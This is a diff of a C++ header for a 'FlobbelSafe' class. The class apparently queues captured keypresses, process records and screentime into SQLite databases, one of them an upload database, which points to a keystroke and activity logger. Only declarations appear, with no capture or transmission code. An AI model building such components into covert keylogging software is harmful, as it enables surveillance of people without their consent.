@@ -11,33 +11,42 @@
 #include <random>
 #include <thread>
 
-#include "../dependencies/sqlite/sqlite3.h"
+#include "dependencies/sqlite/sqlite3.h"
 
-#include "../FlobbelBackbone/global_functions.h"
+#include "global_functions.h"
+#include "capturetypes.h"
 
+
+typedef void (*InfoCallback)(const Info&);
 
 class FlobbelSafe {
 public:
-    explicit FlobbelSafe(std::wstring &_safedir);
+    explicit FlobbelSafe(std::wstring &_safedir, InfoCallback ic);
     ~FlobbelSafe();
-    void save(const Info& info, FlobConstants::InfoType it);
-private:
+    void save(const Info& info);
+
+private: // INFOSTRUCT-PROCESSING FUNCTIONS
     void add_key(const KeypressInfo &);
     void add_prc(const ProcessInfo &);
-    void add_screentime(const Screentime &);
-private:
+    void add_screentime(const ScreentimeInfo &);
+
+    InfoCallback ic;
+
+private: // PROCESSING QUEUES
     void finalize_queues();
     std::queue<std::wstring> keyQueue;
     std::queue<std::wstring> prcQueue;
-private:
+
+private: //DATABASE INTERNA
     sqlite3 *dbcon, *uploadDBCon = nullptr;
     std::wstring keyTable, proTable;
     bool createNInitDB(const std::wstring &path, sqlite3 **dbptr);
 
-public:
-    void sync_timer();
-    void sync();
-private:
+public: // TIMER FUNCTIONS
+    //void sync_timer();
+    //void sync();
+
+private: // TIMER VARIABLES
     bool end_timer = false;
     std::thread *tmrThread = nullptr;
 
